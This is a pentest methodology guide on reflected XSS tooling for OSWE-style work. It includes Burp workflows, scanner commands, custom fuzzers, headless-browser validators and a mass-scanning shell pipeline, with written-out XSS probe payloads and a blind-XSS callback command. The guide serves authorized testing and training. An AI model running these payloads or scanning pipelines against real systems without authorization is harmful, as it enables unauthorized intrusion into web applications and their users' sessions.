# Reflected XSS — Tooling & Automation for OSWE-Level Work

> Companion to [`xss-dom-reflected-hybrid-oswe.md`](xss-dom-reflected-hybrid-oswe.md).  
> Focus: **practical, reproducible** tooling, pipelines, and headless validation for reflected XSS, plus where automation stops and manual OSWE-style exploitation begins.

**Authorization note:** every command below assumes a scoped, written authorization (or your own lab/VM). Rate-limit and scope controls are not optional politeness — they are what keeps a test from becoming an incident.

---

## 0. End-to-end mental model

```
┌────────────┐   ┌────────────┐   ┌────────────┐   ┌────────────┐   ┌────────────┐
│  Collect   │ → │  Scope &   │ → │  Triage    │ → │  Exploit   │ → │  Validate  │
│  URLs      │   │  dedup     │   │  (reflect) │   │  (payload) │   │  (browser) │
└────────────┘   └────────────┘   └────────────┘   └────────────┘   └────────────┘
  gau/wayback    uro/httpx       kxss/gf/        dalfox/          Puppeteer/
  katana         scope file      qsreplace       XSStrike         Playwright
```

Automation is excellent at **breadth** (finding which parameters reflect). It is weak at **depth** (context-specific bypasses, chains, second-order). Plan your time accordingly for OSWE.

---

## 1. Burp Suite

### 1.1 Scanner (active + passive)

- **Passive scan** flags reflections in responses, missing CSP, suspicious sinks in JS — zero requests beyond normal browsing. Good first pass.
- **Active scan** injects canaries into every insertion point and inspects responses for reflection + execution heuristics. Configure via *Scan configuration → XSS* (audit checks: "Reflected XSS", "Stored XSS", "DOM-based XSS").
- **Resource pools / throttling**: *Settings → Network → Throttle* or per-scan resource pool (e.g., max 5 concurrent, delay 200 ms). Essential against WAFs and fragile apps.
- **Scope**: *Target → Scope* with include/exclude regex (e.g., include `^https://app\.target\.com/`, exclude `/logout`, `/admin/delete`). Active scan respects scope only if "Use suite scope" is selected.
- **Audit items / insertion points**: restrict to "URL parameters", "Body parameters", "Cookie parameters" to cut noise; enable "Nested insertion points" for JSON/XML.
- **Confidence/issue severity**: filter to High/Medium to avoid chasing theoretical reflections.

Burp active scan is **context-aware** (it tries HTML-body, attribute, JS-string, URL contexts) but still produces false positives on encoded/escaped reflections. Always confirm in Repeater/browser.

### 1.2 Intruder

Use when you want precise control over one parameter and custom payload lists.

```
Positions:  GET /search?q=§PAYLOAD§&lang=en
Attack type: Sniper (one payload at a time, one position)
Payloads:    XSS payload list (or custom)
Options:
  - Grep - Match:  "alert(1)"  or your canary string  → marks responses that reflect
  - Grep - Extract: capture reflected snippet for review
  - Resource pool:  "Throttle" pool, max 2 concurrent, delay 500 ms
  - Follow redirects: on (some apps redirect after reflection)
```

Attack types:
- **Sniper**: one payload, one position — standard for XSS triage.
- **Battering ram**: same payload in all positions — rare for XSS.
- **Pitchfork**: paired payloads — useful for `param=value` + `callback=` combos (JSONP).
- **Cluster bomb**: cartesian product — only for small matrices; explodes quickly.

Tip: set a unique canary per run (e.g., `XSStest7a3f`) so reflections are unambiguous and grep-match is exact.

### 1.3 Repeater

Manual request/response inspection. Workflow for a reflected param:

1. Send original request, note where input appears in response.
2. Modify value to a context-breaking probe: `"><svg/onload=alert(1)>` (HTML body), `'-alert(1)-'` (JS string), `" onmouseover=alert(1) ` (attribute).
3. Use *Send* and inspect: is it encoded (`&lt;`), stripped, or raw? Does the Content-Type allow execution (`text/html` vs `application/json`)?
4. Use **Burp's "Render"** tab or open in browser to confirm execution.
5. Vary encoding (URL, double URL, HTML entities) to find WAF bypasses; Repeater's *Convert selection* helps.

### 1.4 DOM Invader (Burp's browser)

Built into Burp's embedded Chromium. Automates DOM XSS detection:

- **Sources**: `location.search`, `location.hash`, `location.pathname`, `document.referrer`, `window.name`, `postMessage`, storage.
- **Sinks**: `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location` assignment, jQuery sinks, etc.
- **Canary injection**: injects a unique canary into each source; if the canary reaches a sink, it reports a finding with the source→sink path.
- **Prototype pollution scan**: tests `__proto__`/`constructor.prototype` pollution and looks for gadgets.
- **Web messages**: captures `postMessage` handlers and tests them.
- **CSP**: reports effective CSP and bypass opportunities.

Workflow: open target in Burp browser → enable DOM Invader (default on) → browse the app (trigger JS paths) → review *DOM Invader* tab findings → use "Copy as PoC" to get a ready URL. Combine with manual source→sink tracing from `xss-dom-reflected-hybrid-oswe.md`.

### 1.5 Extensions worth installing

| Extension | Purpose |
|---|---|
| **ActiveScan++** | Extra audit checks: reflected params across the whole app, DOM XSS heuristics, cache poisoning, etc. |
| **XSS Validator** | Uses a headless browser (PhantomJS/Chromium) to actually execute candidate payloads and confirm real XSS, reducing false positives. |
| **Reflector** | Highlights reflected parameters in responses; quick triage. |
| **Param Miner** | Discovers hidden/unlinked parameters (often the ones that reflect). |
| **Collaborator Everywhere** | Injects headers/params that ping Burp Collaborator — useful for blind/second-order XSS callbacks. |
| **Backslash Powered Scanner** | Anomaly-based scanner; catches unusual reflection/encoding. |
| **JS Link Finder / GAP** | Extracts endpoints from JS bundles. |

Install via *Extender → BApp Store*. Note: XSS Validator needs a headless browser binary configured; verify on your Burp version.

---

## 2. Manual CLI tools

### 2.1 XSStrike

Context-aware XSS scanner with fuzzer and WAF detection.

```bash
# basic
python3 xsstrike.py -u "https://target.com/search?q=test"

# crawl + fuzz parameters
python3 xsstrike.py -u "https://target.com" --crawl -l 3

# skip DOM, blind XSS only
python3 xsstrike.py -u "https://target.com/search?q=test" --blind --skip-dom

# custom headers / cookies (auth)
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --headers "Cookie: session=abc123" "X-Requested-With: XMLHttpRequest"

# fuzzer mode (mutate one param)
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer
```

Strengths: context detection, automatic payload crafting, WAF fingerprinting.  
Weaknesses: slower; can miss DOM XSS; needs Python deps. Verify flags with `--help` per version.

### 2.2 dalfox

Fast, pipeline-friendly XSS scanner with DOM mining.

```bash
# single URL
dalfox url "https://target.com/search?q=test"

# from file
dalfox file urls.txt --output results.json --format json

# from stdin (pipe)
cat urls.txt | dalfox pipe

# deep DOM XSS mining
dalfox url "https://target.com/search?q=test" --deep-domxss --mining-dom

# blind XSS (callback)
dalfox url "https://target.com/search?q=test" --blind "https://your-collab.oast.fun"

# WAF evasion
dalfox url "https://target.com/search?q=test" --waf-evasion

# custom payload + header
dalfox url "https://target.com/search?q=test" \
  --custom-payload payloads.txt \
  --header "Cookie: session=abc123"

# discovery only (no exploitation attempts) — good for triage
dalfox url "https://target.com/search?q=test" --only-discovery
```

Useful flags: `--skip-bav` (skip basic another verification), `--remote-payloads`, `--remote-wordlists`, `--silence`, `--no-color`. Output JSON for pipeline consumption.

### 2.3 kxss

Filters URLs to those where a canary reflects in the response (fast triage).

```bash
# stdin URLs → reflected params
cat urls.txt | kxss

# with custom canary
cat urls.txt | kxss -c "REFLECTCANARY99"
```

Output example: `https://target.com/search?q=test  -->  q` (param reflects). Pipe into qsreplace/dalfox.

### 2.4 gf

Grep URLs by pattern (xss, ssrf, redirect, etc.).

```bash
# extract xss-prone URLs
cat all_urls.txt | gf xss > xss_candidates.txt

# list available patterns
gf -list
```

Patterns live in `~/.gf/`. Combine: `cat urls.txt | gf xss | kxss`.

### 2.5 qsreplace

Replace query parameter values with a payload (or canary) for mass testing.

```bash
# replace every param value with a payload
cat urls.txt | qsreplace '"><svg/onload=alert(1)>' > payloads.txt

# replace only a specific param
cat urls.txt | qsreplace -p q '"><svg/onload=alert(1)>'

# then fetch & check reflection
cat payloads.txt | httpx -silent -mr 'svg/onload=alert'
```

Common pipeline: `gau target.com | gf xss | qsreplace CANARY | kxss`.

### 2.6 airixss

Reflection detection with a canary; designed to be fast and pipeline-friendly.

```bash
# basic
cat urls.txt | airixss

# custom payload/canary
cat urls.txt | airixss -payload '"><script>alert(1)</script>'

# with concurrency
cat urls.txt | airixss -c 20
```

Flags vary by version — run `airixss -h`. Often used as: collect → gf xss → airixss → dalfox for confirmation.

### 2.7 Supporting recon tools (context)

```bash
# collect URLs
gau target.com | sort -u > all_urls.txt
waybackurls target.com >> all_urls.txt
katana -u https://target.com -d 3 -o katana_urls.txt

# probe liveness + title/status
cat all_urls.txt | httpx -silent -status-code -title -tech-detect > live.txt

# dedup normalized
cat all_urls.txt | uro > deduped.txt
```

---

## 3. Custom Python/Node scripts

### 3.1 Python — parameter fuzzer + reflection detector

```python
#!/usr/bin/env python3
"""Reflect fuzzer: inject a unique canary per (url, param) and report reflections."""
import asyncio, aiohttp, urllib.parse, re, sys, hashlib

CANARY = "RXSSCANARY_{token}"   # token makes each injection unique
CONCURRENCY = 10

async def fetch(session, url, sem):
    async with sem:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15),
                                  allow_redirects=True, ssl=False) as r:
                body = await r.text(errors="replace")
                return r.status, body, dict(r.headers)
        except Exception as e:
            return None, str(e), {}

def contexts(body, canary):
    """Classify where the canary lands."""
    hits = []
    for m in re.finditer(re.escape(canary), body):
        start = max(0, m.start() - 40)
        snippet = body[start:m.end() + 40]
        kind = "html-body"
        low = snippet.lower()
        if "<script" in low or "</script>" in low:
            kind = "js-context"
        if re.search(r'=\s*["\']?' + re.escape(canary), snippet):
            kind = "attribute"
        if "href=" in low or "src=" in low:
            kind = "url-attr"
        hits.append((kind, snippet.replace("\n", " ")))
    return hits

async def main(urls):
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for u in urls:
            parsed = urllib.parse.urlsplit(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                qs = {"q": [""]}   # probe a default param if none
            for param in qs:
                token = hashlib.md5(f"{u}{param}".encode()).hexdigest()[:8]
                canary = CANARY.format(token=token)
                new_qs = dict(qs)
                new_qs[param] = [canary]
                new_url = urllib.parse.urlunsplit(
                    (parsed.scheme, parsed.netloc, parsed.path,
                     urllib.parse.urlencode(new_qs, doseq=True), parsed.fragment))
                tasks.append((u, param, canary, new_url))

        async def run_one(u, param, canary, new_url):
            status, body, hdrs = await fetch(session, new_url, sem)
            if isinstance(body, str) and canary in body:
                ctxs = contexts(body, canary)
                ctype = hdrs.get("Content-Type", "")
                print(f"[REFLECT] {new_url}")
                print(f"   param={param} status={status} ctype={ctype}")
                for k, sn in ctxs:
                    print(f"   ctx={k} :: {sn[:120]}")

        await asyncio.gather(*(run_one(u, p, c, n) for (u, p, c, n) in tasks))

if __name__ == "__main__":
    urls = [l.strip() for l in sys.stdin if l.strip()]
    asyncio.run(main(urls))
```

Usage:

```bash
cat deduped.txt | python3 reflect_fuzzer.py
```

### 3.2 Node — concurrent fuzzer with p-limit

```js
// reflect-fuzzer.mjs
import pLimit from "p-limit";
import { URL } from "node:url";

const limit = pLimit(10);
const CANARY = "RXSSCANARY";

async function check(u, param) {
  const url = new URL(u);
  const canary = `${CANARY}_${Math.random().toString(36).slice(2, 10)}`;
  url.searchParams.set(param, canary);
  try {
    const r = await fetch(url, { redirect: "follow" });
    const body = await r.text();
    if (body.includes(canary)) {
      // classify context by surrounding text
      const idx = body.indexOf(canary);
      const snippet = body.slice(Math.max(0, idx - 50), idx + canary.length + 50);
      console.log(`[REFLECT] ${url}`);
      console.log(`   param=${param} status=${r.status} ctype=${r.headers.get("content-type")}`);
      console.log(`   snippet=${snippet.replace(/\s+/g, " ")}`);
    }
  } catch (e) {
    // network error; ignore or log
  }
}

const urls = (await (async () => {
  const chunks = [];
  for await (const c of process.stdin) chunks.push(c);
  return Buffer.concat(chunks).toString().split(/\r?\n/).filter(Boolean);
})());

const paramsToTry = ["q", "search", "query", "s", "keyword", "name", "callback", "cb", "redirect", "url", "next", "return"];

const jobs = [];
for (const u of urls) {
  let url;
  try { url = new URL(u); } catch { continue; }
  const existing = [...url.searchParams.keys()];
  const params = existing.length ? existing : paramsToTry;
  for (const p of params) jobs.push(limit(() => check(u, p)));
}
await Promise.all(jobs);
```

Usage:

```bash
node reflect-fuzzer.mjs < deduped.txt
```

### 3.3 Reflection context classifier (Python helper)

```python
def classify_context(snippet, canary):
    """Return likely injection context for choosing a payload."""
    s = snippet.lower()
    if canary in s and ("'" in s or '"' in s) and "script" in s:
        return "js-string"          # try ';alert(1)//
    if "href=" in s or "src=" in s or "action=" in s:
        return "url-attr"           # try javascript:alert(1)
    if re.search(r"<[a-z]+[^>]*" + re.escape(canary), s):
        return "html-attr"          # try " onfocus=alert(1) autofocus
    return "html-body"              # try <svg onload=alert(1)>
```

Use this to auto-select a first payload family, then escalate manually.

### 3.4 Canary + unique-per-param discipline

- Always use a **unique canary per (URL, param)** so you can attribute a reflection unambiguously.
- Include a marker that survives encoding attempts (alphanumeric only) for detection; keep a separate "payload" for exploitation.
- Store results as JSONL (`{"url":..., "param":..., "ctx":..., "snippet":...}`) for dedup and reporting.

---

## 4. Headless browser validation

Reflection ≠ execution. Validate with a real browser. Two complementary techniques:

1. **Dialog/console detection**: navigate to the payload URL; if `alert`/`confirm`/`prompt` fires (or a known console marker), it's real XSS.
2. **Sink instrumentation**: override dangerous setters (`innerHTML`, `document.write`, `eval`, `setTimeout`) to record when a payload reaches a sink — catches DOM XSS even when no dialog fires (e.g., CSP blocks `alert` but sink is still reached).

### 4.1 Playwright — dialog detection

```js
// validate-xss.mjs
import { chromium } from "playwright";

const urls = process.argv.slice(2);   // payload URLs
const browser = await chromium.launch({ headless: true });
const context = await browser.newContext({ ignoreHTTPSErrors: true });

for (const u of urls) {
  const page = await context.newPage();
  let executed = false;
  page.on("dialog", async (d) => {
    executed = true;
    console.log(`[EXECUTED] dialog: ${d.message()}  <-  ${u}`);
    await d.dismiss();
  });
  page.on("console", (m) => {
    if (/XSS_CONFIRMED/i.test(m.text())) {
      executed = true;
      console.log(`[EXECUTED] console marker  <-  ${u}`);
    }
  });
  try {
    await page.goto(u, { waitUntil: "networkidle", timeout: 15000 });
    await page.waitForTimeout(2000);   // let async sinks run
  } catch (e) {
    // navigation timeout / crash; still check executed flag
  }
  if (!executed) console.log(`[NO-EXEC] ${u}`);
  await page.close();
}
await browser.close();
```

Usage:

```bash
node validate-xss.mjs "https://target.com/search?q=%3Csvg%20onload=alert(1)%3E"
```

For blind/second-order XSS, use a callback URL (interactsh/Burp Collaborator) as the payload and check for hits instead of dialogs.

### 4.2 Playwright — sink instrumentation (DOM XSS detection)

```js
// dom-sink-probe.mjs
import { chromium } from "playwright";

const url = process.argv[2];
const browser = await chromium.launch({ headless: true });
const page = await browser.newPage();

// Instrument sinks before navigation
await page.addInitScript(() => {
  const orig = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML").set;
  Object.defineProperty(Element.prototype, "innerHTML", {
    set(v) {
      if (/RXSSCANARY|<svg|onerror|onload/i.test(String(v))) {
        console.log("SINK_HIT innerHTML:", String(v).slice(0, 200));
      }
      return orig.call(this, v);
    },
  });
  const dw = document.write.bind(document);
  document.write = (...a) => {
    const s = a.join("");
    if (/RXSSCANARY|<svg|onerror|onload/i.test(s)) console.log("SINK_HIT document.write:", s.slice(0, 200));
    return dw(...a);
  };
  const origEval = window.eval;
  window.eval = (c) => {
    if (/RXSSCANARY|alert/i.test(String(c))) console.log("SINK_HIT eval:", String(c).slice(0, 200));
    return origEval(c);
  };
});

page.on("console", (m) => console.log("CONSOLE:", m.text()));
await page.goto(url, { waitUntil: "networkidle", timeout: 15000 }).catch(() => {});
await page.waitForTimeout(3000);
await browser.close();
```

### 4.3 Puppeteer equivalent

```js
const puppeteer = require("puppeteer");
(async () => {
  const browser = await puppeteer.launch({ headless: "new" });
  const page = await browser.newPage();
  page.on("dialog", async (d) => { console.log("EXECUTED:", d.message()); await d.dismiss(); });
  await page.goto(process.argv[2], { waitUntil: "networkidle2", timeout: 15000 }).catch(() => {});
  await new Promise((r) => setTimeout(r, 2000));
  await browser.close();
})();
```

### 4.4 Practical notes

- Run headless validation **only against in-scope targets**; it executes attacker JS in a real browser (could trigger stored side effects).
- Use a **fresh context per URL** to avoid state leakage (cookies/storage).
- Some apps require auth: inject session cookies via `context.addCookies([...])`.
- CSP may block `alert` but not the sink; combine dialog detection + sink instrumentation.
- For DOM XSS via `location.hash`/`window.name`, construct the URL/payload accordingly and navigate; `window.name` requires an opener page.

---

## 5. Integration into a testing pipeline

### 5.1 Scope definition

Create a scope file (`scope.txt`) and enforce it everywhere:

```text
# in-scope hosts (regex)
^https://app\.target\.com/
^https://api\.target\.com/
# out-of-scope
!^https://app\.target\.com/logout
!^https://app\.target\.com/admin/delete
```

Enforcement snippet (Python):

```python
import re
scope = [l.strip() for l in open("scope.txt") if l.strip() and not l.startswith("#")]
def in_scope(url):
    for rule in scope:
        if rule.startswith("!"):
            if re.search(rule[1:], url): return False
        else:
            if re.search(rule, url): return True
    return False
```

Also restrict to GET/POST with query/body params; skip binary/static assets by extension.

### 5.2 Rate limiting

- **Concurrency**: `asyncio.Semaphore(N)` / `p-limit(N)`. Start with 5–10; raise only if stable.
- **Delay**: `await asyncio.sleep(0.2)` between batches or use token bucket.
- **Per-host pools**: separate semaphores per host to avoid one slow host starving others.
- **Retries**: exponential backoff on 429/503; honor `Retry-After`.
- **WAF awareness**: if 403 spikes, reduce concurrency and rotate payloads; don't hammer.

### 5.3 Dedup

```python
import hashlib, urllib.parse

def normalize_url(u):
    p = urllib.parse.urlsplit(u)
    qs = sorted(urllib.parse.parse_qsl(p.query, keep_blank_values=True))
    return urllib.parse.urlunsplit((p.scheme, p.netloc.lower(), p.path, urllib.parse.urlencode(qs), ""))

def dedup_urls(urls):
    seen, out = set(), []
    for u in urls:
        key = normalize_url(u)
        if key not in seen:
            seen.add(key); out.append(u)
    return out

def finding_key(host, param, payload_family):
    return hashlib.sha256(f"{host}|{param}|{payload_family}".encode()).hexdigest()
```

Dedup findings by `(host, param, payload family)` — not by full payload — so variants of the same issue collapse.

### 5.4 Reference pipeline (shell)

```bash
#!/usr/bin/env bash
set -euo pipefail
TARGET="target.com"
OUT="work/$(date +%F_%H%M)"
mkdir -p "$OUT"

# 1. Collect
gau "$TARGET" | sort -u > "$OUT/all_urls.txt"
katana -u "https://$TARGET" -d 3 -silent >> "$OUT/all_urls.txt"
sort -u "$OUT/all_urls.txt" -o "$OUT/all_urls.txt"

# 2. Scope + liveness + dedup
cat "$OUT/all_urls.txt" | uro > "$OUT/deduped.txt"
cat "$OUT/deduped.txt" | httpx -silent -mc 200,301,302,403 > "$OUT/live.txt"

# 3. Triage reflections
cat "$OUT/live.txt" | gf xss > "$OUT/xss_candidates.txt"
cat "$OUT/xss_candidates.txt" | qsreplace "RXSSCANARY" | kxss > "$OUT/reflected.txt"

# 4. Automated scan (dalfox) on reflected candidates
cat "$OUT/reflected.txt" | dalfox pipe --format json --output "$OUT/dalfox.json" --silence

# 5. Headless validation (custom) on dalfox findings
# (parse dalfox.json → build payload URLs → node validate-xss.mjs)

echo "Done. Results in $OUT"
```

### 5.5 Reporting artifacts

- Keep raw tool output (JSON) + a normalized findings table: `host, endpoint, param, context, payload, evidence (response snippet / browser console), severity, status`.
- Include reproduction steps (exact URL) and a minimal PoC (no unnecessary params).
- Mark confidence: "confirmed (browser execution)" vs "reflected only (needs manual)".

---

## 6. Limitations of automation vs manual (OSWE exam)

### 6.1 What automation is good at

- Enumerating parameters and endpoints at scale.
- Detecting **raw reflection** (canary in response).
- First-pass context classification (HTML/attr/JS).
- Headless confirmation of simple, unfiltered payloads.
- DOM XSS source→sink detection when sinks are standard and synchronous.

### 6.2 What automation misses (manual territory)

| Area | Why automation fails | OSWE expectation |
|---|---|---|
| **Context-specific bypasses** | WAF/filter-specific encoding, tag/attribute allowlists, exotic tags (`<math>`, `<svg>` foreignObject) | Craft payload to the actual filter & context |
| **Multi-step / second-order** | Reflection appears on a later page, after storage/DB, requiring stateful flow | Trace data flow manually; build chain |
| **Auth & roles** | Scanners run as one user; miss admin-only sinks and cross-user stored XSS | Test as multiple roles; understand session model |
| **DOM XSS with complex sources** | `window.name`, `postMessage` origin checks, prototype pollution gadgets require interaction | Manual source→sink tracing + gadget hunting |
| **Prototype pollution chains** | Gadget reachability depends on app-specific code paths | Manual: find merge, pollute, locate gadget |
| **CSTI sandbox escapes** | Framework version-specific bypasses (AngularJS 1.4 vs 1.5 vs 1.6) | Identify version; apply known bypass; adapt |
| **Blind XSS** | Requires out-of-band callback + patience; scanners fire-and-forget | Set up collaborator; inject into all inputs incl. headers; wait |
| **False positives** | Encoded reflections, JSON responses never rendered as HTML | Manual verification of render context |
| **False negatives** | Params not in URL (hidden, in JS, POST body), custom encoding, anti-automation | Manual parameter discovery (Param Miner, code review) |
| **Business-logic XSS** | E.g., filename in admin log viewer, CSV injection rendered in Excel | Understand features deeply |

### 6.3 OSWE-specific realities

- **White-box**: you have source code. Automation is secondary; `grep`/CodeQL/Semgrep for sinks + manual tracing is primary. Tools like dalfox are for black-box triage, not the exam's core.
- **No internet in exam**: pre-install tools, wordlists, and headless browsers in your VM. Test your pipeline offline beforehand.
- **Time budget**: automation saves hours on recon but the grading is on a working exploit URL/payload and understanding. Don't over-invest in tooling polish at the expense of tracing.
- **Minimal PoC**: graders want the smallest URL that executes in the intended context. Automation's noisy payloads (long polyglots) obscure the actual break; reduce to essentials manually.
- **Chaining**: OSWE rewards chains (XSS → CSRF token theft → account takeover). Automation finds primitives; humans build chains.

### 6.4 Recommended split of effort

```
Recon/breadth  (automation):  20%  — gau, katana, httpx, gf, kxss, dalfox
Validation     (headless):      15%  — confirm execution, reduce FPs
Manual depth   (core):         65%  — source→sink tracing, context bypass, chains, roles
```

### 6.5 Practical checklist before declaring "XSS found"

- [ ] Confirmed execution in a real browser (dialog or sink hit), not just reflection.
- [ ] Identified exact context (HTML body / attribute / JS string / URL / DOM sink).
- [ ] Produced a minimal PoC URL that works in a fresh session.
- [ ] Verified impact: cookie theft possible? HttpOnly? SameSite? CSP blocks? What can the payload actually do?
- [ ] For stored: confirmed another user's session triggers it.
- [ ] For DOM: confirmed without server reflection (hash/window.name/postMessage).
- [ ] Documented scope, rate-limit compliance, and evidence.

---

## Best Practices

- Treat reflection as a **lead**, not a finding — confirm execution.
- Unique canaries per parameter; never reuse across runs when debugging.
- Enforce scope programmatically, not by memory.
- Rate-limit aggressively; a WAF ban wastes more time than slow scanning.
- Dedup early and often; noise kills signal.
- Keep auth sessions fresh; expired cookies produce misleading 302s.
- Prefer JSON output from tools for pipeline integration and re-processing.
- For OSWE: white-box tracing first, tools second; build minimal PoCs; practice offline.
- Always work within written authorization; reflected XSS testing sends payloads to real users' data paths.

---

## Quick reference — one-liners

```bash
# collect + dedup + triage
gau target.com | uro | httpx -silent | gf xss | qsreplace RXSSCANARY | kxss

# dalfox deep DOM
dalfox url "https://target.com/?q=1" --deep-domxss --mining-dom --format json

# xsstrike crawl
python3 xsstrike.py -u "https://target.com" --crawl -l 2

# headless confirm
node validate-xss.mjs "https://target.com/?q=%3Csvg%20onload=alert(1)%3E"
```

---

*Companion docs: [`xss-dom-reflected-hybrid-oswe.md`](xss-dom-reflected-hybrid-oswe.md), [`skills/web-pentest-payloads/references/xss.md`](../../web-pentest-payloads/references/xss.md).*